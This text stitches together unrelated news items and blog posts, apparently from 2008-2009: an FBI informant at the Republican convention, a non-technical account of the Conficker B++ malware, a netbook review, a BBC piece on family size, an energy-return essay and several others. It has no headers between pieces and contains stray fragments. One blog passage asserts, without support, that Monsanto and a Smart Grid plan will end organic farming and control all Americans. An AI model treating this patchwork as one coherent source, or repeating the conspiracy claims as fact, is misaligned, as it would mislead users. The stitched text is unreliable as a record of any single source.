At that point , that ’s when I went forward and contacted somebody in law enforcement . ”
By February 2008 , Darby was involved with a group of activists in Austin , some of whom were making plans to travel to St. Paul to demonstrate during the Republican National Convention .
The FBI labeled the loose - knit organization “ the Austin Area Affinity Group , ” and Darby said he “ intentionally ” got involved with its members .
“ There were … people in the group who were openly saying they were going to stop the constitutional rights of other people and they were going to do things that could possibly break the law , ” Darby claimed .
“ I ’m pretty far from a Republican , but the people attending the convention had a right to speak . ”
Crowder , 22 , worked at a sandwich shop in Austin , and the FBI claimed he was one of the group ’s leaders .
McKay , 23 , did graphic design work at an ad agency and was a member of the group , the government claims .
According to FBI affidavits , Darby provided agents with information about meetings the group had as well as meetings with activists in other parts of the country , including a planning meeting in Minneapolis in May .
He also purportedly provided information about riot shields McKay and Crowder had made from highway safety barrels they had stolen .
A rented U - Haul trailer held 35 of the shields as well as helmets and batons .
Affidavits and testimony in pretrial hearings show that Darby was providing FBI agents with updates on the location of the trailer .
St . Paul police eventually found the trailer , broke the lock and seized its contents , but a federal magistrate has recommended that the shields and other items be excluded from evidence at the upcoming trial because police never sought a warrant to search the trailer .
Darby told agents that McKay and Crowder decided to retaliate by building Molotov cocktails .
They bought the materials at Wal - Mart on University Avenue in St. Paul , then built the devices and stored them at the Dayton Avenue apartment building where they were staying .
Police later raided the building and seized eight firebombs in the basement .
PROUD OF HIS ROLE
Although the FBI zealously protects the names of its confidential informants , Darby ’s name leaked out during a pretrial hearing .
Darby initially declined to comment , but colleagues were quick to come to his defense and dismiss the published reports .
Crow had called the claim that Darby was an informant “ an absolute … lie . ”
After getting Darby ’s e-mail this week , Crow said he was shocked .
“ I can only say it ’s heartbreaking and it ’s shocking .
This is somebody who has been known to me for six years , and it ’s shaken me to my core that somebody this close to me had been informing on me and others , ” he said .
Darby said he ’s proud of the role he played , and he believes it helped make life more “ stable . ”
“ I decided that the way I was going about things was not the right way to do it , ” he said .
“ While it may have satisfied part of me , it really was n’t changing anything . ”

This is one well - designed piece of malware :
Conficker B++ is somewhat similar to Conficker B , with 294 of 297 sub - routines the same and 39 additional subroutines .
The latest variant , first spotted on 16 February , is even more sneaky than its previous incarnations , SRI explains .
Conficker B++ is no longer limited to reinfection by similarly structured Conficker DLLs , but can now push new self - contained Win32 applications .
These executables can infiltrate the host using methods that are not detected by the latest anti-Conficker security applications .
[…]
The malware also creates an additional backdoor on compromise machines to create an altogether trickier infectious agent , SRI explains .
In Conficker A and B , there appeared only one method to submit Win32 binaries to the digital signature validation path , and ultimately to the CreateProcess API call .
This path required the use of the Internet rendezvous point to download the binary through an HTTP transaction .
Under Conficker B++ , two new paths to binary validation and execution have been introduced to Conficker drones , both of which bypass the use of Internet Rendezvous points : an extension to the netapi32.dll patch and the new named pipe backdoor .
These changes suggest a desire by the Conficker ’s authors to move away from a reliance on Internet rendezvous points to support binary update , and toward a more direct flash approach .
SRI reckons that Conficker - A has infected 4.7 m machines , at one time or another , while Conficker - B has hit 6.7 m IP addresses .
These figures , as with previous estimates , come from an analysis of the number of machines that have ever tried to call into malware update sites .
The actual number of infected hosts at any one time is lower than that .
SRI estimates the botnet controlled by Conficker - A and Conficker - B is around 1 m and 3 m hosts , respectively , or a third of the raw estimate .
I have always known the person I wanted to be – hanging out in coffee shops , the park or the beach ; writing a book , blogging , twittering and facebooking .
And as I pictured myself doing all this , there 's one constant accessory by my side : a computer small enough to be my companion .
Netbooks seemed perfect for my aspirations .
They are compact enough to slide inside my Brahmin bag , light enough for my 120 - pounds frame to carry all day and fit exactly the kind of tasks I had in mind : word processing , e-mail , social networking and surfing .
So when the pink MSI Wind arrived at the Wired.com office a few weeks ago I was almost giddy with excitement .
As I cradled the MSI Wind home that evening I believed it could change my life .
But – and there 's always a " but " when you have a crush – our romance was short - lived .
Things were promising at first .
My HP and Dell laptops have have always been too big and bulky to lug around .
And I blamed them for keeping me away from the coffee shop .
After all , for me the bitter brew does n't taste the same if there is n't an electronic screen to sweeten it .
Now I could start going to coffee shops and spend time surfing on my little netbook .
Setting up the new netbook at home was easy and I was online within minutes .
And then the nightmare started .
The keyboard was too cramped .
I spent most of my time correcting what I had typed , even simple URLs .
My fingers were cramped and my wrist started aching after a while .
And staring at the screen hurt my eyes .
I closed the Wind and hoped to come back to it the next day .
Over the weekend I carried the Wind to the coffee shop on the next block .
Thirty minutes later I was out of the door nursing a painful wrist and watery eyes .
It was the same story at the beach next day .
My dreams of typing the next great manuscript did n't work out .
I could n't stay on the machine for more than 15 minutes .
After four days I gave up .
The pink Wind now sits in a corner of the the Gadget Lab , unused and unloved .
I have n't given on getting a sub -$ 400 netbook that is really lightweight and comfortable to use .
Someday the right one will come along and it could still change my life .
But for now , I live with the same old me .

Gov. David A. Paterson introduced a bill on Thursday to legalize same - sex marriage , vowing to personally involve himself in the legislative debate at a level that is rare for a chief executive in New York .
Throwing the weight of his office behind legislation that still faces considerable obstacles in Albany , Mr. Paterson said he would leverage the personal relationships he developed over two decades in the State Senate to see the bill voted on  and passed .
The vote is expected to turn on the thinnest of margins in the Senate , and some advocates say Mr. Paterson ’s direct involvement could prove pivotal .
At a news conference in Manhattan on Thursday , Mr. Paterson , a Democrat , invoked the abolitionist movement of the 1800s , the writings of Harriet Beecher Stowe and the Supreme Court ’s Dred Scott decision to argue that New York had neglected civil rights for gays and lesbians for too long .
“ I ’m putting a stop to it , ” he said .
“ We have a duty to make sure equality exists for everyone . ”
The announcement came amid growing activity around the country on same - sex marriage : Iowa and Vermont have legalized the practice in the past month , and the New Hampshire State Senate has been debating it this week .
Massachusetts and Connecticut already have gay marriage , and a campaign is under way to extend it across New England by 2012 .

Is it selfish to have more than two children ?
One of the Whitehouse children lives elsewhere , leaving four remaining at home
By Margaret Ryan
BBC News
Is having more than two children selfish ?
The future of the planet rarely plays a part when planning a family , but that 's got to change , say environmental campaigners .
Parents who have more than two children are " irresponsible " for placing an intolerable burden on resources and increasing damage to eco-systems , says a leading green campaigner .
Curbing population growth through contraception must play a role in fighting global warming , argues Jonathon Porritt .
This week , the Optimum Population Trust ( OPT ) , of which Mr Porrit is a patron , launched its " Stop at Two " online pledge to encourage couples to limit their family 's size .
If you polled mums and asked them for 10 reasons why they would not want more children the list would include money , sleepless nights and the strain on relationships
Siobhan Freegard , Netmums website Mr Porritt said earlier this month : " I think we will work our way towards a position that says having more than two children is irresponsible . "
He is not advocating a compulsory limit but told the BBC that couples should " connect up their concerns with the natural environment with their decisions as prospective parents " .
" Every additional human being is increasing the burden on this planet which is becoming increasingly intolerable , " says Mr Porritt , who runs the government 's Sustainable Development Commission .
Each extra person in the UK emits around 11 tonnes of carbon dioxide per annum , he argues , but he warns population is a subject even some environmentalists think too controversial to discuss .
The Total Fertility Rate ( TFR ) in the UK reached 1.90 children per woman in 2007 .
UK fertility has not been this high since 1980 , according to the Office for National Statistics .
The UK population alone is expected to increase from 61 million to 77 million by 2051 but the OPT believes the UK 's long - term sustainable population level may be lower than 30 million .
" The more couples decide to have just one or two children , or even remain childless , the more they can relieve pressures on rapidly deteriorating ecosystems and alleviate demand for dwindling energy and food resources , " says policy director Rosamund McDougall .
If women in the UK stopped at two children , this would cut the UK 's forecast population by an estimated seven million by 2050 , the OPT suggests .
But for mother - of - five Rosie Whitehouse , green issues did not play a part in her and her husband 's decision to have a large family .
VIEW FROM A MOTHER OF SIX Emma Quinton , 41 , from Brighton , has six children ranging from 22 months to 10 years ' I never planned to have this many children .
They got to a certain age and I wanted another '
Would consider having a seventh but worried about money and the emotional toll ' We would have started earlier and had more '
Benefit of a large family is that they learn to share and they do their bit for the planet by never flying long - haul " Life is n't as simple as that , " says Mrs Whitehouse , a former journalist .
" For most women the environment does n't figure at all .
I was making programmes about global warming when I became pregnant with my first son , who is now 20 , and it did n't enter my head , " she says , although she can understand why Mr Porritt feels justified in raising the issue .
" I did n't think about money and what it was going to cost either .
I just had this romantic idea , " she says .
Mrs Whitehouse , 47 , who works full - time and lives in London , queries whether larger families necessarily place a greater burden on the environment .
" Money is important so you do n't buy ready - made meals .
I cooked up cauldrons of soup . "
' No more toys '
And just because you have five children " it does not mean you have five times the amount of plastic toys , " she says .
" You just have to say ' no more ' . "
She has four children still living at home aged 18 , 15 and twins aged 10 and says they are environmentally aware .
But she does not believe green issues will be uppermost in her daughters ' minds when they come to think about having a family .
Being one of four children means sometimes you need to escape " Pregnancy is introspective .
It is a selfish time , especially when you first find out , " she says .
It 's a sentiment echoed by mother - of - three Siobhan Freegard who says environmental considerations are n't even on the radar when couples think about how many children they want .
" If you polled mums and asked them for 10 reasons why they would not want more children the list would include money , sleepless nights and the strain on relationships , " says Ms Freegard , of the online parent network Netmums .
The bottom line would certainly seem to focus the minds of many parents , judging by recent research .
The average cumulative cost of raising a child from birth to the age of 21 is about £ 193,000 , according to a survey by the insurer Liverpool Victoria .
Ms Freegard says it is " crazy " to think the impact on the environment would even figure in the family planning process .
She has two sons , aged 12 and six , and a nine - year - old daughter .
With the birth of her youngest , she felt they were a proper family , although managing three children has n't been easy : " It was messy and I lost control of things , but in a good way . "
And as one of five children herself , she extols the virtues of a large family , for example in having siblings to share caring for a parent .
" It 's about having some support and sharing the load .
I wanted to recreate that for my own children . "
A selection of your comments appears below .
I have to say that I disagree with the women in this article ; I 'm the very proud mother of an 8 year old daughter and during my pregnancy , as I thought about how I wanted to care for her - we chose organic food and non-disposable nappies - I became acutely conscious of her potential impact on the environment ; further highlighted every time I then washed a non-disposable nappy !
When I consider the possibility of having more children I do think of their impact on the environment and , as I 've become more aware of the environmental and social issues facing our society , I would be far more likely to foster or adopt a child .
Lucy , Benfleet , UK I have three children .
I feel it is my duty to attempt to repopulate the World with intelligent individuals in an attempt to offset Mr Porritt 's stupidity .
Idiocy - offsetting , kind of like carbon offsetting , just a little more immediate .
Kirstine Berry , Bracknell I do n't think that deciding not to have kids for the sake of the world at large is crazy at all .
It 's one of the reasons we have decided not to have any children .
That and the fact that we would n't want any child of ours to have to endure the increasingly bleak future that is coming .
These people who have 5 children - what if they each had five children etc ?
The world can't sustain the people it 's already got .
Having lots of children shows a lack of thought and care , in my opinion .
Hannah Wilson , Cardiff
I agree that people should definitely take the environment into consideration when it comes to starting a family , and that really having two children is enough .
However I think it 's unfair to blanket judge the population by calling it ' irresponsible ' to have more than two .
My partner and I , in the near future are planning to start a family and though we probably would have stopped at two ( for financial reasons ) the environment would not have been at all considered .
I agree that raising awareness of this issue is essential but judging ready established large families is not the way to do it .
Lou , Shropshire
In addition to the environment there is the economy to consider .
If population growth surpasses economic growth , then a country gets poorer .
Many poorer countries are trapped in a situation where population is exploding and the economy cannot cope with it .
Although China 's one child policy is controversial , it may have been one of the factors that led to China 's rise in the world economy
Katie , Cork , Ireland " Is having more than two children selfish ?
The future of the planet rarely plays a part when planning a family , but that 's got to change , say environmental campaigners . "
No , condescending environmental extremists are selfish for presuming to tell the rest of the world what it may or may not do .
What a beautiful family the Whitehouses are !

It 's all very well to tell people to limit the size of their families .
I was lucky enough to have two girls but sadly one of them died when she was in her twenties .
Sadly tragedies do happen sometimes and this should be taken into account .
Sue , Minehead I would agree it's selfish and irresponsible to have more than two children .
What 's " crazy " is that the environment does n't figure in more of our decisions .
It makes me rather sad that these people who decide they need a large family do n't seem to consider adoption .
There are many children already in this world who would greatly benefit from a loving home , surely this is a far better way to have a large family ?
Linden , Winsford , Cheshire I am very passionate about this issue !
I personally have chosen not to have any children , as I believe it is simply unethical to do so considering the disastrous environmental state of our planet , and the vast numbers of children who already exist that do not have homes .
I may have selfish hormonal desires to procreate at times , but values and ethics are vastly more important .
Anyone who considers themselves environmentalists should strongly consider doing the same .
Elyse Kleidon , Bellingham WA , United States
Either have one or more does n't matter as long as each child have the full attention and good care from the parents .
However , if I can choose I would pick only two ... a family ticket of four would go anywhere and easy to handle while travelling .

IN THE movie WALL·E , humankind has left Earth in a bit of a mess .
The planet is choked with garbage and all the people have shipped out , leaving robot WALL·E to clean the place up and make it habitable again .
Things may not be quite that bad yet , but there ’s no doubt that we produce a huge amount of waste .
Even with increased recycling , landfill sites are filling up by the day and - in the absence of a plucky robot – the waste experts of planet Earth are working on the next best thing : landfill mining .
The idea is simple .
Instead of disappearing under mountains of our own waste , while paying through the nose for diminishing commodities , why not dig up and recycle what we have already thrown away ?
Next week , industry experts will gather in London for the first global landfill mining conference .
Bringing together environmental scientists , economists and landfill operators , the one - day meeting promises to show delegates how to turn waste into “ garbage gold ” .
Landfill mining has been tried before .
The first scheme began in 1953 at Hiriya garbage dump outside Tel Aviv , Israel , and aimed to reclaim fine - particle waste rich in minerals to improve soil quality at local citrus fruit farms .
The landfill closed in 1998 , but the recycling plant that remains on the site still produces soil improver from green waste .
Then during the 1960s and 1970s , a handful of sites in the US began separating waste to recycle the steel and to compost food scraps .
In the late 1980s , a pilot programme was set up to extract recyclables from a small , community landfill …
Letter from Thomas Jefferson - " I Have Sworn Upon the Altar of God eternal hostility against every form of tyranny over the mind of man . "
To Dr. Benjamin Rush - Monticello , Sep. 23 , 1800
_To Dr. Benjamin Rush_ _Monticello , Sep. 23 , 1800 _ DEAR SIR , -- I have to acknolege the receipt of your favor of Aug. 22 , and to congratulate you on the healthiness of your city .
Still Baltimore , Norfolk & Providence admonish us that we are not clear of our new scourge .
When great evils happen , I am in the habit of looking out for what good may arise from them as consolations to us , and Providence has in fact so established the order of things , as that most evils are the means of producing some good .
The yellow fever will discourage the growth of great cities in our nation , & I view great cities as pestilential to the morals , the health and the liberties of man .
True , they nourish some of the elegant arts , but the useful ones can thrive elsewhere , and less perfection in the others , with more health , virtue & freedom , would be my choice .
I agree with you entirely , in condemning the mania of giving names to objects of any kind after persons still living .
Death alone can seal the title of any man to this honor , by putting it out of his power to forfeit it .
There is one other mode of recording merit , which I have often thought might be introduced , so as to gratify the living by praising the dead .
In giving , for instance , a commission of chief justice to Bushrod Washington , it should be in consideration of his integrity , and science in the laws , and of the services rendered to our country by his illustrious relation , &c .
A commission to a descendant of Dr. Franklin , besides being in consideration of the proper qualifications of the person , should add that of the great services rendered by his illustrious ancestor , Bn Fr , by the advancement of science , by inventions useful to man , &c .
I am not sure that we ought to change all our names .
And during the regal government , sometimes , indeed , they were given through adulation ; but often also as the reward of the merit of the times , sometimes for services rendered the colony .
Perhaps , too , a name when given , should be deemed a sacred property .
I promised you a letter on Christianity , which I have not forgotten .
On the contrary , it is because I have reflected on it , that I find much more time necessary for it than I can at present dispose of .
I have a view of the subject which ought to displease neither the rational Christian nor Deists , and would reconcile many to a character they have too hastily rejected .
I do not know that it would reconcile the _genus irritabile vatum_ who are all in arms against me .
Their hostility is on too interesting ground to be softened .
The delusion into which the X. Y. Z. plot shewed it possible to push the people ; the successful experiment made under the prevalence of that delusion on the clause of the constitution , which , while it secured the freedom of the press , covered also the freedom of religion , had given to the clergy a very favorite hope of obtaining an establishment of a particular form of Christianity thro ' the U. S. ; and as every sect believes its own form the true one , every one perhaps hoped for his own , but especially the Episcopalians & Congregationalists .
The returning good sense of our country threatens abortion to their hopes , & they believe that any portion of power confided to me , will be exerted in opposition to their schemes .
And they believe rightly ; for I have sworn upon the altar of god , eternal hostility against every form of tyranny over the mind of man .
But this is all they have to fear from me : & enough too in their opinion , & this is the cause of their printing lying pamphlets against me , forging conversations for me with Mazzei , Bishop Madison , &c. , which are absolute falsehoods without a circumstance of truth to rest on ; falsehoods , too , of which I acquit Mazzei & Bishop Madison , for they are men of truth .
But enough of this : it is more than I have before committed to paper on the subject of all the lies that has been preached and printed against me .
I have not seen the work of Sonnoni which you mention , but I have seen another work on Africa , ( Parke's , ) which I fear will throw cold water on the hopes of the friends of freedom .
You will hear an account of an attempt at insurrection in this state .
I am looking with anxiety to see what will be it's effect on our state .
We are truly to be pitied .
I fear we have little chance to see you at the Federal city or in Virginia , and as little at Philadelphia .
It would be a great treat to receive you here .
But nothing but sickness could effect that ; so I do not wish it .
For I wish you health and happiness , and think of you with affection .
Adieu .
When perusing my local dead tree Sunday newspaper 's Business section , I came across the headline , Frugality pays off : Avoiding debt looks smart for area firms and thought , " Hey , this looks like something that my readers would enjoy . "
They 've done exactly what I 've said that companies should do :
Be frugal during the good times and the lean times wo n't seem so lean .
They also maintain their business by purchasing only what they can pay for .
But who listens to such rubbish ?
Apparently , a few do and they seem to be in the minority - a solvent minority .
Will too much frugality lead to economic collapse ?
Say it ai n't so .
But , that evening , I read a Newsweek * article titled , Stop Saving Now ! , a cover story that actually encourages you , the consumer , to stop being so darn frugal and spend some money .
The writer prompts us to take risks again and let go of our death grip on those dollars .
Is this what we should do to get this economy going ?
I pondered at great length over these two diametrically opposed viewpoints and came up with the following idea :
Use Linux for your business and buy an iPod for your kids .
The Newsweek writer , Daniel Gross , states in his article :
If everyone saves during a slack period , economic activity will decrease , thus making everyone poorer .
We also need to start investing again - not necessarily in the stock of Citigroup or in condos in Miami .
But rather to build skills , to create the new companies that are so vital to growth , and to fund the discovery and development of new technologies .
I agree .
Development of those new technologies on a commodity platform like Linux allows startup companies to enter the market with less capital and compete more effectively with their larger counterparts .
In addition , using free open source applications and technologies encourages innovation and creation of new products for technology - hungry buyers .
For smaller companies and startups , maintaining a high level of frugality is necessary for survival in any market environment .
More tips on how to Cover Your Assets
Linux wo n't directly save individual consumers a bundle of cash , but they will find financial solace in Linux - based services whether they know the services are Linux - based or not .
I 'm speaking of cloud services , of which more than 90 percent run on Linux .
And now that XenServer is free , cloud vendors have plenty of incentive to make their services economically palatable to even the most tight - fisted among you .
Both of my journalist colleagues are correct  frugality is good for you and your customers , and spending is good for the economy .
Being fiscally responsible is also good for the economy  yours , mine and ours collectively .
Using Linux saves you money so that you , in turn , pass on those savings to your customers and enjoy higher profits for your company .
Higher profits and greater savings mean more money for raises , bonuses and consumerism .
I 'm no economist , but I 'd say it 's a pretty good plan .

I have written here many times about NAIS and now the Obama government , having promised people would have 60 days to comment , having promised transparency , having promised it was in support of small farmers , is pushing through as rapidly as humanly possible , bills that will mean the end of organic farming .
How ?
By Monsanto entering into the body of organic farming like a disease and morphing organic farms into industrial facilities , the farmer being forced to " treat " the land with chemicals and the animals with drugs , trapped into paying for what is unwanted , unsafe , unneeded , unconstitutional .
This is monopoly at the most extreme degree - not just unfair competition but total control of every aspect of the competition to the degree of making them laborers for the monopoly .
Here is the senate version .
http://www.govtrack.us/congress/bill.xpd?bill=s111-425
The bill has been referred to the following committees :
Senate Agriculture , Nutrition , and Forestry .
Sent to committee on February 9 , 2009 we are not allowed to know what happens in committee .
For some reason these things are secret and we can't most times even know how anyone voted .
As this site points out , if you do not have a rep or senator on the committees ……. they do n't ' want to hear from you .
In the House : http://www.govtrack.us/congress/bill.xpd?bill=h111-875
A bill in the US Congress : To establish the Food Safety Administration within the Department of Health and Human Services to protect the public health ………….
Referred to committee on February 4 , 2009
House Energy and Commerce
House Agriculture
The bills in both the House and Senate are virtually identical .
This means this whole deal was decided at the same time Smart Grid was inserted into the Stimulus Package .
The house and Senate bills will lay the groundwork for NAIS and other programs , and Smart Grid will make them operable .
Both these bills appeared simultaneously in both houses , having been planned before the fact .
This speeds them through committee and brings them to the floor to be calendared .
Since both bills are identical , there will be motions to suspend the rules on debates .
Meaning none will be allowed .
We will have to watch these closely as they will appear suddenly on probably the same day with the House voting first in the morning and the Senate in the afternoon .
Not one rep or senator has denied , refuted or argued even one of our articles or any of our statements .
Not one major paper has covered any of it .
This is all part of the Smart Grid System of controlling everything in our lives and us – to me it is the Patriot Act gone ballistic , digitizing every aspect of our lives and leaving no area of privacy or true freedom whatsoever .
Do people even remember anymore how different life used to be , how it belonged to us and only us ?

Last paragraph .
One of the largest components of Smart Grid is already being implemented by the USDA ; it 's called the National Animal Identification System ( NAIS ) it requires farmers to implant a RFID tag into the body of all of their livestock–cows , pigs , goats , chickens , sheep , all livestock .
The NAIS threatens to destroy small - scale family farms .
If you 're not familiar with the NAIS , here are a couple of resources : Downsize DC , NAIS :
Too little too late ?
and NAIS : Let 's do some fuzzy math .
Coupled with Smart Grid , the NAIS strengthens the ability of Government officials to control rural Americans as completely as they control people in the cities .
President Obama believes implementing Smart Grid is urgent .
He wants the program to expand quickly , with all of us on the thinking grid by 2011 .
All of us .
Notice the great rush to do this .
The great and unjust and non-transparent and immensely UNDEMOCRATIC rush - to force on the entire country something they know nothing about .
We are talking about one of the most massively controlling laws in the history of this country and one affecting the health and thus existence of every single person .
We are talking about the take over of the US food supply by industrial forces and the contamination and thus death of organic farming through stealth .
Everything green , healthy , anti-global warming , local , decent , environmental , community building , independent , free thing that organic farming is , we need .
But the corruption of our government and politicians by Monsanto and especially the Clinton influence on behalf of Monsanto , is bringing us horror .
Obama must be held accountable .
The bum 's rush is not grassroots anything .
The implementation of plans laid during Bush 's regime is not change .
This , no matter how you cut is , is fascist .
The following is a post by both Dr. Charles Hall and EROI Guy .
Most of the material comes from a recently published book chapter titled “ Peak oil , EROI , investments and the economy in an uncertain future . ”
The book can be found here .
Dr. Charles Hall is a professor of Systems Ecology at the College of Environmental Science and Forestry in Syracuse , New York , and has written about energy issues many times on The Oil Drum , found here .
The enormous expansion of the human population and the economies of the United States and many other nations in the past 100 years have been accompanied by , and allowed by , a commensurate expansion in the use of fossil ( old ) fuels , meaning coal , oil and natural gas .
To many energy analysts that expansion of cheap fuel energy has been the principal enabler of economic expansion , far more important than business acumen , economic policy or ideology although they too may be important ( e.g. Soddy 1926 , Cottrell 1955 , Georgescu Roegan 1971 , Odum 1972 , Kummel 1982 , Kummel 1989 , Jorgenson 1984 and 1988 , Hall et al. 1986 ( and others ) , Dung 1992 , Ayres 1996 ) .
While we are used to thinking about the economy in monetary terms , those of us trained in the natural sciences consider it equally valid to think about the economy and economics from the perspective of the energy required to make it run .
When one spends a dollar , we do not think just about the dollar bill leaving our wallet and passing to some one else ’s .
Rather , we think that to enable that transaction , that is to generate the good or service being purchased , an average of about 8,000 kilojoules of energy ( equal to roughly the amount of oil that would fill a coffee cup ) must be extracted from the Earth and turned into roughly a half kilogram of carbon dioxide ( U.S. Statistical Review , various years ) .
History has shown that removing the energy supply from the economy will cause it to contract immensely or even stop .
Cuba found this out in 1991 when the Soviet Union , facing its own oil production and political problems at that time , cut off Cuba ’s subsidized oil supply .
Both Cuba ’s energy use and its GDP declined immediately by about one third , all groceries disappeared from market shelves within a week and the average Cuban lost 20 pounds ( Quinn 2006 ) .
Cuba subsequently learned to live , in some ways well , on about half the oil as previously , but the impacts were enormous .
While the United States has become more efficient in using energy in recent decades , most of this is due to using higher quality fuels , exporting heavy industry and switching the way we define economic activity ( e.g. Kaufmann 2004 ) .
Many other countries , including efficiency leader Japan , are becoming substantially less efficient ( Hall and Ko , 2007 , LeClerc and Hall 2007 , Smil , personal communication ) .
So if energy is required for economic growth and maintenance , then the important question is how much oil and gas ( i.e. energy ) is left in the world ?
The answer is a lot , although probably not a lot relative to our increasing needs , and maybe not a lot that we can afford to exploit with a large financial and , especially , energy profit .
Therefore a more precise question might be , “ How much oil is left that will yield a large energy profit ? "
Energy return on investment is a way to answer the latter .
Energy Return On Investment ( EROI or EROEI ) is simply the energy that one obtains from an activity compared to the energy it took to generate that energy .
The procedures are generally straightforward ; simply divide the Energy Gained ( Out ) by the Energy Used ( In ) , resulting in a unitless ratio .
The running average EROI for the finding and production of US domestic oil has dropped from greater than 100 kilojoule returned per kilojoule invested in the 1930s to about 30 to 1 in the 1970s to between 11 and 18 to 1 today .
This is a consequence of decreasing energy returns as oil reservoirs are depleted and as energy costs increase as exploration and development are shifted deeper and offshore ( Cleveland et al.
1984 , Hall et al. 1986 , Cleveland 2004 ) .
Even that ratio reflects mostly pumping out oil fields that are half a century or more old since we are finding few significant new fields .
In other words we can say that new oil is becoming increasingly more costly , in terms of dollars and energy , to find and extract .
The increasing energy cost of a marginal barrel of oil or gas is one of the factors behind their increasing dollar cost , although if one corrects for general inflation the price of oil has increased only a moderate amount .
The same pattern of declining energy return on energy investment appears to be true for global petroleum production .
Getting information on global oil production is very difficult , but a study currently submitted for publication indicates that the global EROI for petroleum production has been declining over the past 8 years and is currently about 18:1 ( Gagnon and Hall , submitted ) .
In fact , if the rate of decline continues linearly for several decades then it would take the energy in a barrel of oil to get a new barrel of oil .
While we do not know whether that extrapolation is accurate , essentially all EROI studies of our principal fossil fuels do indicate that their EROI is declining over time , and that EROI declines especially rapidly with increased exploitation rates ( e.g. drilling ) .
This decline appears to be reflected in economic news also .
In November of 2004 , The New York Times reported that for the previous three years oil exploration companies worldwide had spent more money in exploration than they had recovered in the dollar value of reserves found .
Therefore it is possible that the energy “ break - even ” point has been approached or even reached for finding new oil .
Whether we have reached this point or not the concept of EROI declining toward 1:1 makes irrelevant the reports of several oil analysts who believe that we may have substantially more oil left in the world , because it does not make sense to extract oil , at least for a fuel , when it requires more energy for the extraction than is found in the oil extracted .
Declining EROI rates for US and World oil exploration and production indicate that our [ society ’s ] ability to weather the coming peak oil storm will depend in large part on how we manage our investments now .
From the perspective of energy , there are three general types of investments that we make in society .
The first is investments into getting energy itself ; the second is investments for maintenance of , and replacing , existing infrastructure ; and the third is discretionary expansion .
In other words , before we can think about expanding the economy we must first make the investments into getting the energy necessary to operate the existing economy , and into maintaining the infrastructure that we have , at least unless we wish to accept the entropy - driven degradation of what we already have .
Declining EROI means that the required investments into the second and especially the first category are likely to increasingly limit what is available for the third .
In other words , the amount of energy and dollars spent supplying the energy for economic maintenance will likely increase , while the remainder left for discretionary purposes will likely decrease .
Declining EROI is mainly a consequence of the “ best first ” principle .
This is , quite simply , the characteristic of humans to use the highest quality resources first , be they timber , fish , soil , copper ore or , of relevance here , fossil fuels .
This is because economic incentives are to exploit the highest quality , least cost ( both in terms of energy and dollars ) resources first , as was noted 200 years ago by economist David Ricardo ( 1821 ) .
For instance , the peak in finding oil was in the 1930s for the United States and in the 1960s for the world , and both have declined enormously since then .
An even greater decline has taken place in the efficiency with which we find oil ; that is the amount of energy that we find relative to the energy we invest in seeking and exploiting it .
The pattern of exploiting and depleting the best resources first is occurring for natural gas as well .
US natural gas originally came from large fields in Louisiana , Texas and Oklahoma .
Its production has moved increasingly to smaller fields distributed throughout Appalachia and , increasingly , the Rockies .
The largest fields that traditionally supplied the country with natural gas peaked in 1973 , and then as “ unconventional ” fields were developed second by drilling a vast amount of wells , a somewhat smaller peak occurred in 2007 .
In summary , there are three related forces that may reshape societies and economies around the world : peak global oil production , declining EROI of global oil exploration and production , and the “ Best First Principle ” .
They imply that we no longer have the ability to substantially increase oil production without substantially increasing the amount of oil used to get that oil , and finally , that any new discoveries will invariably cost increasing amounts of money and energy to produce .
The interplay of these three forces will most likely limit the amount of money designated for discretionary spending , while increasing the amount of money and energy needed just to sustain economic function .

It will be fantastic to work together again . "

The Defense Department will release " a substantial number " of photographs showing abuse of prisoners at prisons in Iraq and Afghanistan , according to the American Civil Liberties Union .
Aggressive techniques to interrogate terror suspects are making headlines again .
The release will be in response to an open - records lawsuit filed by the ACLU , the group said in a written statement .
The statement released late Thursday said the photos were taken at facilities other than Abu Ghraib prison in Iraq .
" These photographs provide visual proof that prisoner abuse by U.S. personnel was not aberrational but widespread , reaching far beyond the walls of Abu Ghraib , " Amrit Singh , an ACLU attorney , said in the release .
The photos are to be released by May 28 , the ACLU said .
The Department of Defense announced in a letter addressed to the federal court on Thursday that it would release the photos .
In a copy of the letter posted on the ACLU 's Web site , acting U.S. Attorney Lev L. Dassin said that 21 photographs would be released and that the government " also is processing for release a substantial number of other images . "
The lawsuit was filed in 2004 after the Bush administration denied a 2003 open - records request by the ACLU .
The 2nd Circuit U.S. Court of Appeals ruled last year that the photos should be released .
The Defense Department will not appeal the case to the U.S. Supreme Court , Dassin said in the letter .
Attempts by CNN to reach the White House and Department of Defense for comment were not immediately successful .

Ronald Reagan speaks to the ’ 64 Republican convention
Thanks to the folks at MofoPolitics.com for reminding us of that moment in history when Ronald Reagan was thrust upon the national stage .
“ It occurs to me having just watched this , ” Mofo said , “ that Barack Obama is n’t regarded as so charismatic and articulate because he is so charismatic and so articulate , but because he is so charismatic and so articulate in comparison to those politicians he has had the good fortune to run against . ”
No fancy production values .
No special effects .
No overpaid speech writers .
Just Ronald Reagan being Ronald Reagan .

Cattle Carcasses Heat British Town
February 17th , 2009 by Ariel Schwartz
A Swedish town announced last month that it will use cremated bodies to provide heat , and now the British town of Reepham has decided to heat many of its buildings by burning oil made from melted cow and pig carcasses .
Are dead bodies — human or otherwise — the next big thing in heating ?
Probably not , since carcasses and crematoriums are in limited supply .
But Reepham ’s scheme , at least , has a relatively low carbon footprint .
The town is using cooking oil and tallow ( melted fatty remains ) mixed with fossil fuels to make a biofuel blend .
Eighty percent of tallow ’s carbon footprint comes from making the animals and their fat , so why not use the carcasses if people will eat the meat beforehand anyway ?
Children in Reepham schools will have the chance to observe cuts in carbon emissions with energy monitors placed in each classroom , but it ’s doubtful that the kids will find out exactly where their heat is coming from .

The wings were rolled slowly to avoid the possibility of snagging
Ten years after its construction began , the International Space Station now has full power capability .
Mission controllers commanded the unfurling on Friday of the platform 's fourth and final pair of solar arrays .
The huge solar wings had been delivered to the ISS by the Discovery shuttle and installed by its astronauts with the help of the station 's robotic arm .
When taken up to full capacity , the station 's arrays should now generate as much as 120 kilowatts of electricity .
The addition of the final set of solar wings will double the amount of power available for scientific experiments aboard the station - from 15 kW to 30kW .
Please turn on JavaScript .
Media requires JavaScript to play .
The unfurling of the 73 m - long ( 240 ft ) structures went very smoothly .
" It 's just really amazing , " commented Mike Fincke , the space station 's commander .
He said there was " a shout of triumph " from astronauts aboard the linked station - shuttle complex once the two wings were fully extended .
When viewed from the Earth 's surface shortly after sunset , the ISS appears as a very bright star moving swiftly across the sky .
The addition of a larger reflective area will make the platform an even more brilliant spectacle .
